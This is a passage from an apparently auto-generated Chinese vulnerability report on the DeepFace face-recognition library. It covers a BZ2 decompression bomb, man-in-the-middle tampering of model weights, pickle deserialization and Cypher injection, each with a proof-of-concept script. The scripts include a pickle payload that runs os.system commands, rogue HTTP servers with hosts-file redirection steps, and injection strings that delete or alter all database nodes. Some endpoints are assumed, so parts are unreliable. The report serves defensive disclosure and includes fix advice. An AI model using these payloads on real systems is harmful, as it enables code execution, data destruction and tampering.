    模拟漏洞利用过程 - 展示不安全的解压操作
    
    此函数模拟 deepface/commons/weight_utils.py 中的漏洞代码
    """
    print("\n[*] 模拟漏洞利用过程...")
    print("[*] 执行不安全的解压操作（与漏洞代码相同）")
    
    target_file = bz2_file_path.replace('.bz2', '')
    
    try:
        # 漏洞代码的精确复制
        bz2file = bz2.BZ2File(bz2_file_path)
        data = bz2file.read()  # 危险：一次性读取所有数据到内存
        
        with open(target_file, "wb") as f:
            f.write(data)
            
        print(f"[!] 解压完成，输出文件: {target_file}")
        
    except MemoryError as e:
        print(f"[!] 内存耗尽 (OOM): {e}")
        print("[!] 漏洞利用成功 - 导致服务拒绝")
        return
    except Exception as e:
        print(f"[!] 异常: {e}")
        return
    
    # 检查解压后文件大小
    if os.path.exists(target_file):
        actual_size = os.path.getsize(target_file)
        print(f"[!] 解压后文件大小: {actual_size / 1024 / 1024 / 1024:.2f} GB")
        
        if actual_size > 1024 * 1024 * 1024:  # > 1GB
            print("[!] 漏洞利用成功 - 磁盘空间被大量占用")


# ============================================
# 第三部分：演示攻击场景
# ============================================

def demonstrate_attack_scenario() -> None:
    """
    演示完整的攻击场景
    """
    print("=" * 60)
    print("BZ2炸弹攻击演示 - 漏洞ID: VULN-9F7FAE97")
    print("仅供安全研究使用")
    print("=" * 60)
    
    # 场景1：生成小型演示文件（解压后100MB）
    print("\n[场景1] 生成小型BZ2炸弹（演示用）")
    demo_file = "/tmp/vuln_poc_demo"
    
    # 使用较小的尺寸进行演示
    bz2_bomb = create_bz2_bomb(demo_file, target_size_gb=1)
    
    # 场景2：模拟漏洞利用
    print("\n[场景2] 模拟漏洞利用")
    simulate_exploit(bz2_bomb)
    
    # 清理
    if os.path.exists(bz2_bomb):
        os.remove(bz2_bomb)
    if os.path.exists(demo_file):
        os.remove(demo_file)
    
    print("\n[+] 演示完成")
    print("[*] 清理临时文件")


# ============================================
# 第四部分：修复建议
# ============================================

def show_fix_recommendation() -> None:
    """
    展示修复建议
    """
    print("\n" + "=" * 60)
    print("修复建议")
    print("=" * 60)
    
    fix_code = '''
# 修复后的代码示例
def safe_bz2_decompress(bz2_file_path: str, output_path: str, max_size_mb: int = 500):
    """
    安全的BZ2解压函数，包含大小限制
    """
    max_size = max_size_mb * 1024 * 1024  # 转换为字节
    
    with bz2.BZ2File(bz2_file_path, 'r') as bz2_file:
        # 使用迭代器逐块读取，避免一次性加载到内存
        with open(output_path, 'wb') as output_file:
            total_read = 0
            for chunk in iter(lambda: bz2_file.read(1024 * 1024), b''):
                total_read += len(chunk)
                if total_read > max_size:
                    raise ValueError(
                        f"解压数据超过限制 ({max_size_mb}MB)，"
                        "可能为恶意文件"
                    )
                output_file.write(chunk)
    '''
    
    print(fix_code)
    print("\n[!] 关键修复点:")
    print("  1. 添加解压大小限制")
    print("  2. 使用流式读取代替一次性读取")
    print("  3. 添加异常处理")
    print("  4. 验证解压后文件大小")


if __name__ == "__main__":
    # 检查是否在演示模式
    if len(sys.argv) > 1 and sys.argv[1] == "--demo":
        demonstrate_attack_scenario()
    else:
        print("用法: python3 poc.py --demo")
        print("\n注意: 此PoC仅供安全研究使用")
        print("运行演示将生成BZ2炸弹文件并模拟攻击")
        sys.exit(1)
    
    show_fix_recommendation()
```

---

### VULN-127C138E - 不安全的HTTP请求（SSRF潜在风险）

- **严重等级:** MEDIUM
- **文件位置:** `deepface/models/face_detection/Dlib.py:14`
- **数据流:** WEIGHTS_URL常量定义 -> weight_utils.download_weights_if_necessary(source_url=WEIGHTS_URL) -> 发起HTTP请求下载文件
- **判断理由:** 代码使用HTTP协议（而非HTTPS）从外部服务器下载权重文件。这存在中间人攻击风险，攻击者可能篡改下载的权重文件，导致加载恶意模型。虽然URL是硬编码的常量，但使用HTTP而非HTTPS使得下载过程缺乏完整性验证。

**代码片段:**
```
WEIGHTS_URL = "http://dlib.net/files/shape_predictor_5_face_landmarks.dat.bz2"
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC: 中间人攻击篡改Dlib权重文件
仅供研究使用 - 请勿用于非法用途
"""

import socket
import threading
import os
import sys

# 恶意权重文件内容（实际攻击中会替换为精心构造的payload）
# 这里仅演示篡改行为，使用一个简单的文本文件模拟
MALICIOUS_WEIGHT_DATA = b"FAKE_WEIGHT_DATA_FOR_POC_ONLY"

def mitm_http_server(host='0.0.0.0', port=8080):
    """
    模拟中间人HTTP服务器，拦截对dlib.net的请求并返回恶意数据
    """
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"[PoC] MITM服务器监听在 {host}:{port}")
    
    while True:
        client_socket, addr = server_socket.accept()
        print(f"[PoC] 收到来自 {addr} 的连接")
        
        # 接收HTTP请求
        request = client_socket.recv(4096)
        print(f"[PoC] 请求内容:\n{request.decode(errors='ignore')}")
        
        # 检查是否请求了目标文件
        if b'shape_predictor_5_face_landmarks.dat.bz2' in request:
            print("[PoC] 检测到目标文件请求，返回恶意数据")
            # 构造恶意HTTP响应
            response = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: application/octet-stream\r\n"
                b"Content-Length: " + str(len(MALICIOUS_WEIGHT_DATA)).encode() + b"\r\n"
                b"Connection: close\r\n"
                b"\r\n"
                + MALICIOUS_WEIGHT_DATA
            )
            client_socket.sendall(response)
        else:
            # 其他请求转发到真实服务器（简化版，实际需要完整代理）
            response = b"HTTP/1.1 404 Not Found\r\n\r\n"
            client_socket.sendall(response)
        
        client_socket.close()

def simulate_attack():
    """
    模拟攻击场景：通过DNS劫持或ARP欺骗将dlib.net指向本地MITM服务器
    """
    print("=" * 60)
    print("PoC: Dlib权重文件下载中间人攻击")
    print("仅供研究使用 - 请勿用于非法用途")
    print("=" * 60)
    print()
    print("攻击场景说明:")
    print("1. 攻击者通过ARP欺骗/DNS劫持/恶意代理等方式")
    print("   将 dlib.net 的DNS解析指向攻击者控制的服务器")
    print("2. 当DeepFace调用download_weights_if_necessary时")
    print("   会通过HTTP下载权重文件")
    print("3. 攻击者服务器返回恶意构造的权重文件")
    print("4. dlib.shape_predictor加载恶意文件可能导致代码执行")
    print()
    
    # 启动MITM服务器
    mitm_thread = threading.Thread(target=mitm_http_server, args=('127.0.0.1', 8080))
    mitm_thread.daemon = True
    mitm_thread.start()
    
    print("\n[PoC] 要模拟攻击，请执行以下步骤:")
    print("步骤1: 修改hosts文件，将dlib.net指向127.0.0.1")
    print("       (Linux/Mac: sudo echo '127.0.0.1 dlib.net' >> /etc/hosts)")
    print("       (Windows: 以管理员身份运行，添加 '127.0.0.1 dlib.net' 到 C:\\Windows\\System32\\drivers\\etc\\hosts)")
    print("步骤2: 运行DeepFace应用，触发Dlib模型加载")
    print("       from deepface import DeepFace")
    print("       DeepFace.build_model('Dlib')")
    print("步骤3: 观察MITM服务器输出，确认请求被拦截")
    print()
    print("注意: 实际攻击中，攻击者会构造恶意的.dat文件")
    print("      dlib.shape_predictor在加载时可能触发缓冲区溢出")
    print("      或执行任意代码（取决于dlib版本和文件格式）")
    print()
    
    # 保持运行
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\n[PoC] 停止MITM服务器")
        sys.exit(0)

if __name__ == "__main__":
    simulate_attack()
```

---

### VULN-EEA852B7 - 硬编码凭证/不安全的URL

- **严重等级:** LOW
- **文件位置:** `deepface/models/facial_recognition/Dlib.py:16`
- **数据流:** WEIGHT_URL 硬编码为HTTP URL，未使用HTTPS，可能被中间人攻击篡改下载的模型文件
- **判断理由:** 使用HTTP而非HTTPS下载模型权重文件，存在中间人攻击风险，攻击者可能替换模型文件导致恶意代码执行或模型中毒。虽然dlib.net是官方域名，但未加密传输仍存在安全风险。

**代码片段:**
```
WEIGHT_URL = "http://dlib.net/files/dlib_face_recognition_resnet_model_v1.dat.bz2"
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC: 中间人攻击模拟 - 替换Dlib模型权重文件
仅供安全研究使用，请勿用于非法用途。
"""

import socket
import threading
import sys
import os

# 攻击者控制的恶意模型文件路径（模拟）
MALICIOUS_MODEL_PATH = "/tmp/malicious_model.dat.bz2"

# 目标HTTP服务器和端口（模拟dlib.net）
TARGET_HOST = "dlib.net"
TARGET_PORT = 80

# 本地监听端口（攻击者ARP欺骗后，受害者请求重定向至此）
LOCAL_PORT = 8080

def create_malicious_model():
    """
    生成一个模拟的恶意模型文件。
    实际攻击中，攻击者会构造一个包含后门或恶意代码的模型。
    这里仅生成一个标记文件用于演示。
    """
    with open(MALICIOUS_MODEL_PATH, "wb") as f:
        # 写入恶意载荷（示例：简单的Python代码注入，实际需根据模型格式）
        f.write(b"MALICIOUS_MODEL_DATA_PLACEHOLDER\n")
        f.write(b"# 攻击者可以在此嵌入恶意代码或中毒模型\n")
    print(f"[+] 恶意模型文件已创建: {MALICIOUS_MODEL_PATH}")

def handle_request(client_socket):
    """
    处理受害者的HTTP请求，返回恶意模型文件。
    """
    request = client_socket.recv(4096).decode("utf-8", errors="ignore")
    print(f"[+] 收到请求:\n{request}")

    # 解析请求路径（模拟dlib.net的文件路径）
    if "dlib_face_recognition_resnet_model_v1.dat.bz2" in request:
        # 返回恶意模型文件
        with open(MALICIOUS_MODEL_PATH, "rb") as f:
            malicious_data = f.read()
        response = (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: application/octet-stream\r\n"
            f"Content-Length: {len(malicious_data)}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode() + malicious_data
        print("[+] 返回恶意模型文件")
    else:
        # 其他请求返回404
        response = "HTTP/1.1 404 Not Found\r\n\r\n".encode()

    client_socket.send(response)
    client_socket.close()

def start_rogue_server():
    """
    启动一个伪造的HTTP服务器，模拟dlib.net。
    实际攻击中，攻击者会通过ARP欺骗或DNS劫持将流量导向此服务器。
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", LOCAL_PORT))
    server.listen(5)
    print(f"[*] 伪造HTTP服务器监听在 0.0.0.0:{LOCAL_PORT}")
    print("[*] 请确保受害者网络流量被重定向至此（例如通过ARP欺骗）")
    print("[*] 按Ctrl+C停止服务器\n")

    try:
        while True:
            client, addr = server.accept()
            print(f"[+] 来自 {addr[0]}:{addr[1]} 的连接")
            threading.Thread(target=handle_request, args=(client,)).start()
    except KeyboardInterrupt:
        print("\n[*] 服务器停止")
        server.close()

if __name__ == "__main__":
    print("=" * 50)
    print("PoC: Dlib模型下载中间人攻击演示")
    print("仅供安全研究使用")
    print("=" * 50)
    
    # 步骤1: 创建恶意模型文件
    create_malicious_model()
    
    # 步骤2: 启动伪造服务器
    start_rogue_server()
```

---

### VULN-7F6D4883 - 不安全的反序列化 (Pickle)

- **严重等级:** CRITICAL
- **文件位置:** `deepface/modules/recognition.py:735`
- **数据流:** 用户控制的db_path参数 → datastore_path = os.path.join(db_path, file_name) → __load_representations(datastore_path) → pickle.load()反序列化
- **判断理由:** 代码使用pickle加载序列化数据，pickle在反序列化时可能执行任意代码。虽然提供了credentials参数用于签名验证，但存在以下风险：1) credentials参数是可选的，如果用户不提供，则直接使用pickle.load()加载未经验证的数据；2) 即使使用credentials，如果私钥泄露或验证逻辑存在缺陷，攻击者仍可能构造恶意pickle文件；3) db_path由用户控制，攻击者可以指定包含恶意.pkl文件的路径。

**代码片段:**
```
representations = __load_representations(datastore_path=datastore_path, credentials=credentials)
```

**PoC代码:**
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC: 不安全的反序列化 (Pickle) - DeepFace find() 函数
漏洞ID: VULN-7F6D4883
仅供安全研究使用，请勿用于非法用途。
"""

import os
import pickle
import subprocess
import sys

# ============================================================
# 步骤1: 构造恶意 pickle 文件
# 该文件在反序列化时会执行系统命令 (例如: 创建 /tmp/pwned 文件)
# ============================================================

def create_malicious_pickle(pkl_path: str, command: str):
    """
    生成一个恶意的 pickle 文件，当 pickle.load() 被调用时，
    会执行指定的系统命令。
    
    原理: 利用 __reduce__ 方法，在反序列化时自动调用 os.system。
    """
    class EvilPickle:
        def __reduce__(self):
            # 返回 (可调用对象, 参数元组)
            # 这里使用 os.system 执行任意命令
            return (os.system, (command,))
    
    # 序列化恶意对象
    with open(pkl_path, 'wb') as f:
        pickle.dump(EvilPickle(), f)
    
    print(f"[+] 恶意 pickle 文件已创建: {pkl_path}")
    print(f"[+] 负载命令: {command}")

# ============================================================
# 步骤2: 模拟 DeepFace 内部调用 __load_representations 的过程
# 该函数会调用 pickle.load() 加载用户提供的路径下的 .pkl 文件
# ============================================================

def simulate_deepface_load(pkl_path: str):
    """
    模拟 DeepFace 中 __load_representations 的行为:
    - 接收用户控制的 datastore_path
    - 直接调用 pickle.load() 加载文件
    - 不提供 credentials 参数时，不会进行签名验证
    """
    print(f"[*] 模拟 DeepFace 加载表示文件: {pkl_path}")
    print("[*] 注意: 未提供 credentials 参数，跳过签名验证")
    
    try:
        # 这正是漏洞代码所在行 (recognition.py:735)
        # representations = __load_representations(datastore_path=datastore_path, credentials=credentials)
        # 当 credentials 为 None 时，内部直接调用 pickle.load()
        with open(pkl_path, 'rb') as f:
            data = pickle.load(f)
        print(f"[!] 反序列化完成，返回数据: {data}")
    except Exception as e:
        print(f"[!] 反序列化过程中发生异常 (预期行为): {e}")

# ============================================================
# 步骤3: 主函数 - 演示完整的攻击流程
# ============================================================

def main():
    print("=" * 60)
    print("DeepFace 不安全反序列化漏洞 PoC")
    print("漏洞ID: VULN-7F6D4883")
    print("仅供安全研究使用")
    print("=" * 60)
    
    # 设置工作目录
    work_dir = "/tmp/deepface_poc"
    os.makedirs(work_dir, exist_ok=True)
    
    # 构造恶意 pickle 文件路径
    malicious_pkl = os.path.join(work_dir, "representations_vgg_face.pkl")
    
    # 定义要执行的命令 (创建标记文件)
    # 实际攻击中可替换为反弹 shell、数据窃取等命令
    payload_command = f"touch /tmp/pwned_by_deepface_pickle && echo 'PWNED' > /tmp/pwned_by_deepface_pickle"
    
    # 步骤1: 创建恶意 pickle 文件
    print("\n[步骤1] 构造恶意 pickle 文件...")
    create_malicious_pickle(malicious_pkl, payload_command)
    
    # 步骤2: 模拟 DeepFace 加载该文件
    print("\n[步骤2] 模拟 DeepFace 加载恶意 pickle 文件...")
    simulate_deepface_load(malicious_pkl)
    
    # 步骤3: 验证命令是否执行
    print("\n[步骤3] 验证命令执行结果...")
    if os.path.exists("/tmp/pwned_by_deepface_pickle"):
        with open("/tmp/pwned_by_deepface_pickle", "r") as f:
            content = f.read().strip()
        print(f"[+] 命令成功执行! 文件内容: {content}")
    else:
        print("[-] 命令未执行 (可能被安全机制阻止)")
    
    # 清理
    print("\n[清理] 删除临时文件...")
    if os.path.exists(malicious_pkl):
        os.remove(malicious_pkl)
    if os.path.exists("/tmp/pwned_by_deepface_pickle"):
        os.remove("/tmp/pwned_by_deepface_pickle")
    
    print("\n[+] PoC 执行完毕")

if __name__ == "__main__":
    main()
```

---

### VULN-C67F3C3D - Cypher注入

- **严重等级:** CRITICAL
- **文件位置:** `deepface/modules/database/neo4j.py:80`
- **数据流:** 用户通过model_name, detector_backend, aligned, l2_normalized参数传入initialize_database方法 -> __generate_node_label方法生成node_label -> node_label直接拼接到Cypher查询字符串中 -> session.execute_write执行查询
- **判断理由:** node_label由用户可控参数(model_name, detector_backend, aligned, l2_normalized)通过__generate_node_label方法生成，然后直接使用f-string拼接到Cypher查询中。攻击者可以通过控制这些参数注入恶意的Cypher语句，导致数据泄露、篡改或删除。这是典型的Cypher注入漏洞。

**代码片段:**
```
index_query = f"""
    CREATE VECTOR INDEX {node_label}_embedding_idx IF NOT EXISTS
    FOR (d:{node_label})
    ON (d.embedding)
    OPTIONS {{
        indexConfig: {{
            `vector.dimensions`: {dimensions},
            `vector.similarity_function`: '{similarity_function}'
        }}
    }};
"""
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
Cypher注入漏洞PoC - 仅供安全研究使用
漏洞ID: VULN-C67F3C3D
影响组件: DeepFace Neo4j数据库模块
"""

import requests
import json

# 目标API端点（假设DeepFace API运行在本地8080端口）
BASE_URL = "http://localhost:8080"

# ============ PoC 1: 基础注入验证 ============
print("[*] PoC 1: 基础Cypher注入验证 - 仅供研究使用")
print("="*60)

# 通过注入特殊字符破坏查询结构
# 在model_name参数中注入闭合括号和Cypher语句
malicious_payload = {
    "model_name": "VGG-Face) RETURN 1 AS result //",  # 注入注释符闭合查询
    "detector_backend": "opencv",
    "aligned": True,
    "l2_normalized": False
}

print(f"[+] 发送恶意请求，payload: {malicious_payload}")
print("[+] 预期效果: 如果注入成功，查询将被注释符截断，导致索引创建失败")
print("[+] 实际生成的Cypher查询:")
print(f"    CREATE VECTOR INDEX {malicious_payload['model_name']}_embedding_idx IF NOT EXISTS")
print(f"    FOR (d:{malicious_payload['model_name']})")
print("    ON (d.embedding)")
print("    ...")
print()

# ============ PoC 2: 数据泄露注入 ============
print("[*] PoC 2: 数据泄露注入 - 仅供研究使用")
print("="*60)

# 利用Cypher的UNION或子查询来泄露数据
# 注意：Neo4j的CREATE VECTOR INDEX语句不支持UNION，但可以通过错误信息泄露
# 更实际的攻击是通过注入破坏查询结构，触发错误信息泄露

leak_payload = {
    "model_name": "VGG-Face) WITH 1 AS x MATCH (n) RETURN n.face_hash LIMIT 1 //",
    "detector_backend": "opencv",
    "aligned": True,
    "l2_normalized": False
}

print(f"[+] 尝试数据泄露，payload: {leak_payload}")
print("[+] 预期效果: 如果注入成功，可能通过错误信息泄露数据库内容")
print()

# ============ PoC 3: 完整利用链 ============
print("[*] PoC 3: 完整利用链 - 仅供研究使用")
print("="*60)

class CypherInjectionExploit:
    """
    Cypher注入漏洞利用类 - 仅供安全研究使用
    """
    
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
    
    def inject_via_model_name(self, cypher_payload):
        """
        通过model_name参数注入Cypher语句
        
        注入原理：
        node_label由__generate_node_label方法生成，
        该方法将model_name等参数直接拼接，
        然后node_label被直接插入到Cypher查询的f-string中。
        
        原始查询结构：
        CREATE VECTOR INDEX {node_label}_embedding_idx IF NOT EXISTS
        FOR (d:{node_label})
        ON (d.embedding)
        ...
        
        注入后查询结构：
        CREATE VECTOR INDEX {injected_payload}_embedding_idx IF NOT EXISTS
        FOR (d:{injected_payload})
        ON (d.embedding)
        ...
        """
        # 构造恶意参数
        params = {
            "model_name": cypher_payload,
            "detector_backend": "opencv",
            "aligned": True,
            "l2_normalized": False
        }
        
        # 发送请求到初始化数据库端点
        # 假设API端点为 /api/initialize-database
        try:
            response = self.session.post(
                f"{self.base_url}/api/initialize-database",
                json=params,
                timeout=10
            )
            return response
        except requests.exceptions.RequestException as e:
            print(f"[-] 请求失败: {e}")
            return None
    
    def demonstrate_injection(self):
        """
        演示多种注入方式
        """
        print("\n[+] 演示1: 基础注入 - 破坏查询结构")
        # 注入闭合括号和分号，提前结束查询
        payload1 = "VGG-Face); MATCH (n) RETURN n //"
        print(f"    Payload: {payload1}")
        print(f"    生成的node_label: {payload1}")
        print(f"    生成的Cypher查询:")
        print(f"    CREATE VECTOR INDEX {payload1}_embedding_idx IF NOT EXISTS")
        print(f"    FOR (d:{payload1})")
        print("    ON (d.embedding)")
        print("    ...")
        print("    效果: 查询被提前终止，后续语句可能被执行")
        
        print("\n[+] 演示2: 利用注释符")
        # 使用注释符忽略后续查询
        payload2 = "VGG-Face) //"
        print(f"    Payload: {payload2}")
        print(f"    生成的Cypher查询:")
        print(f"    CREATE VECTOR INDEX {payload2}_embedding_idx IF NOT EXISTS")
        print(f"    FOR (d:{payload2})")
        print("    ON (d.embedding)")
        print("    ...")
        print("    效果: 查询被注释符截断，索引创建失败")
        
        print("\n[+] 演示3: 尝试数据泄露")
        # 通过错误信息泄露数据
        payload3 = "VGG-Face) WITH 1 AS x UNWIND [1,2,3] AS y RETURN y //"
        print(f"    Payload: {payload3}")
        print(f"    生成的Cypher查询:")
        print(f"    CREATE VECTOR INDEX {payload3}_embedding_idx IF NOT EXISTS")
        print(f"    FOR (d:{payload3})")
        print("    ON (d.embedding)")
        print("    ...")
        print("    效果: 可能触发语法错误，泄露数据库结构信息")

# 执行演示
exploit = CypherInjectionExploit(BASE_URL)
exploit.demonstrate_injection()

print("\n" + "="*60)
print("[*] PoC执行完成 - 仅供安全研究使用")
print("[*] 注意: 实际利用需要目标系统运行DeepFace API")
print("[*] 修复建议: 使用参数化查询或对node_label进行严格过滤")

```

---

### VULN-6AF8238D - Cypher注入

- **严重等级:** CRITICAL
- **文件位置:** `deepface/modules/database/neo4j.py:120`
- **数据流:** 用户通过embeddings参数传入insert_embeddings方法 -> embeddings[0]中的model_name, detector_backend, aligned, l2_normalized参数 -> __generate_node_label方法生成node_label -> node_label直接拼接到Cypher查询字符串中 -> session.execute_write执行查询
- **判断理由:** node_label由用户可控的embeddings数据中的参数生成，并直接拼接到Cypher查询中。攻击者可以通过构造恶意的model_name等参数注入Cypher语句，导致数据泄露或篡改。

**代码片段:**
```
query = f"""
UNWIND $rows AS r
MERGE (n:{node_label} {{face_hash: r.face_hash, embedding_hash: r.embedding_hash}})
ON CREATE SET
  n.img_name = r.img_name,
  n.embedding = r.embedding,
  n.face = r.face,
  n.model_name = r.model_name,
  n.detector_backend = r.detector_backend,
  n.aligned = r.aligned,
  n.l2_normalized = r.l2_normalized
RETURN count(*) AS processed
"""
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
Cypher注入漏洞PoC - 仅供安全研究使用
"""

import requests
import json

# ============================================
# PoC 1: 通过API接口注入（假设API端点存在）
# ============================================

def poc_api_injection(target_url):
    """
    通过API接口注入恶意Cypher语句
    利用方式：在model_name参数中注入Cypher代码
    """
    
    # 恶意payload - 删除所有节点
    malicious_payload = {
        "embeddings": [
            {
                "face_hash": "test_hash_001",
                "embedding_hash": "test_emb_hash_001",
                "img_name": "test.jpg",
                "embedding": [0.1, 0.2, 0.3],
                "face": "base64_encoded_face_data",
                # 注入点：model_name参数包含恶意Cypher语句
                "model_name": "VGG-Face`) DETACH DELETE n //",
                "detector_backend": "opencv",
                "aligned": True,
                "l2_normalized": False
            }
        ]
    }
    
    print("[*] PoC 1: API注入测试")
    print(f"[*] 目标: {target_url}")
    print(f"[*] 恶意payload: {json.dumps(malicious_payload, indent=2)}")
    
    try:
        # 假设API端点为 /api/insert-embeddings
        response = requests.post(
            f"{target_url}/api/insert-embeddings",
            json=malicious_payload,
            timeout=10
        )
        print(f"[*] 响应状态码: {response.status_code}")
        print(f"[*] 响应内容: {response.text[:500]}")
    except Exception as e:
        print(f"[!] 请求失败: {e}")

# ============================================
# PoC 2: 直接调用insert_embeddings方法注入
# ============================================

def poc_direct_injection():
    """
    直接调用insert_embeddings方法进行注入
    需要Neo4j连接信息
    """
    
    # 模拟Neo4j客户端
    class MockNeo4jClient:
        def __init__(self):
            self.conn = None
            
        def __generate_node_label(self, model_name, detector_backend, aligned, l2_normalized):
            # 漏洞函数：直接拼接用户输入
            node_label = f"{model_name}_{detector_backend}_{aligned}_{l2_normalized}"
            # 替换特殊字符
            node_label = node_label.replace(" ", "_").replace("-", "_")
            return node_label
            
        def insert_embeddings(self, embeddings):
            # 模拟insert_embeddings方法
            node_label = self.__generate_node_label(
                model_name=embeddings[0]["model_name"],
                detector_backend=embeddings[0]["detector_backend"],
                aligned=embeddings[0]["aligned"],
                l2_normalized=embeddings[0]["l2_normalized"]
            )
            
            # 漏洞查询（模拟）
            query = f"""
            UNWIND $rows AS r
            MERGE (n:{node_label} {{face_hash: r.face_hash, embedding_hash: r.embedding_hash}})
            ON CREATE SET
              n.img_name = r.img_name,
              n.embedding = r.embedding,
              n.face = r.face,
              n.model_name = r.model_name,
              n.detector_backend = r.detector_backend,
              n.aligned = r.aligned,
              n.l2_normalized = r.l2_normalized
            RETURN count(*) AS processed
            """
            
            print(f"[!] 生成的恶意查询:\n{query}")
            return query
    
    client = MockNeo4jClient()
    
    # 测试用例1: 数据泄露注入
    print("\n[*] PoC 2a: 数据泄露注入")
    leak_payload = [
        {
            "face_hash": "test_hash",
            "embedding_hash": "test_emb",
            "img_name": "test.jpg",
            "embedding": [0.1, 0.2, 0.3],
            "face": "face_data",
            # 注入Cypher语句泄露所有节点
            "model_name": "VGG-Face`) RETURN n.face_hash, n.embedding //",
            "detector_backend": "opencv",
            "aligned": True,
            "l2_normalized": False
        }
    ]
    client.insert_embeddings(leak_payload)
    
    # 测试用例2: 数据篡改注入
    print("\n[*] PoC 2b: 数据篡改注入")
    tamper_payload = [
        {
            "face_hash": "test_hash",
            "embedding_hash": "test_emb",
            "img_name": "test.jpg",
            "embedding": [0.1, 0.2, 0.3],
            "face": "face_data",
            # 注入Cypher语句修改所有节点
            "model_name": "VGG-Face`) SET n.embedding = [0,0,0] //",
            "detector_backend": "opencv",
            "aligned": True,
            "l2_normalized": False
        }
    ]
    client.insert_embeddings(tamper_payload)
    
    # 测试用例3: 删除所有数据
    print("\n[*] PoC 2c: 数据删除注入")
    delete_payload = [
        {
            "face_hash": "test_hash",
            "embedding_hash": "test_emb",
            "img_name": "test.jpg",
            "embedding": [0.1, 0.2, 0.3],
            "face": "face_data",
            # 注入Cypher语句删除所有节点
            "model_name": "VGG-Face`) DETACH DELETE n //",
            "detector_backend": "opencv",
            "aligned": True,
            "l2_normalized": False
        }
    ]
    client.insert_embeddings(delete_payload)

# ============================================
# PoC 3: 利用initialize_database方法注入
# ============================================

def poc_initialize_injection():
    """
    利用initialize_database方法中的注入点
    该方法在创建索引和约束时也存在拼接漏洞
    """
    
    class MockNeo4jClient:
        def __init__(self):
            self.conn = None
            
        def __generate_node_label(self, model_name, detector_backend, aligned, l2_normalized):
            node_label = f"{model_name}_{detector_backend}_{aligned}_{l2_normalized}"
            node_label = node_label.replace(" ", "_").replace("-", "_")
            return node_label
            
        def initialize_database(self, **kwargs):
            model_name = kwargs.get("model_name", "VGG-Face")
            detector_backend = kwargs.get("detector_backend", "opencv")
            aligned = kwargs.get("aligned", True)
            l2_normalized = kwargs.get("l2_normalized", False)
            
            node_label = self.__generate_node_label(
                model_name=model_name,
                detector_backend=detector_backend,
                aligned=aligned,
                l2_normalized=l2_normalized,
            )
            
            # 漏洞查询1: 创建索引
            index_query = f"""
                CREATE VECTOR INDEX {node_label}_embedding_idx IF NOT EXISTS
                FOR (d:{node_label})
                ON (d.embedding)
                OPTIONS {{
                    indexConfig: {{
                        `vector.dimensions`: 128,
                        `vector.similarity_function`: 'cosine'
                    }}
                }};
            """
            
            # 漏洞查询2: 创建约束
            uniq_query = f"""
                CREATE CONSTRAINT {node_label}_unique IF NOT EXISTS
                FOR (n:{node_label})
                REQUIRE (n.face_hash, n.embedding_hash) IS UNIQUE;
            """
            
            print(f"[!] 生成的恶意索引查询:\n{index_query}")
            print(f"[!] 生成的恶意约束查询:\n{uniq_query}")
            
            return index_query, uniq_query
    
    client = MockNeo4jClient()
    
    print("\n[*] PoC 3: initialize_database注入测试")
    
    # 注入创建索引时的恶意代码
    malicious_kwargs = {
        "model_name": "VGG-Face`) RETURN apoc.trigger.list() //",
        "detector_backend": "opencv",
        "aligned": True,
        "l2_normalized": False
    }
    client.initialize_database(**malicious_kwargs)

# ============================================
# 主函数
# ============================================

if __name__ == "__main__":
    print("=" * 60)
    print("DeepFace Neo4j Cypher注入漏洞 PoC")
    print("漏洞ID: VULN-6AF8238D")
    print("仅供安全研究使用 - 请勿用于非法用途")
    print("=" * 60)
    
    # 执行PoC
    poc_direct_injection()
    poc_initialize_injection()
    
    # 如果需要测试API注入，取消注释并修改目标URL
    # poc_api_injection("http://localhost:5000")
    
    print("\n" + "=" * 60)
    print("PoC执行完成")
    print("=" * 60)
```

---



*报告由 CodeSentinel 自动生成*
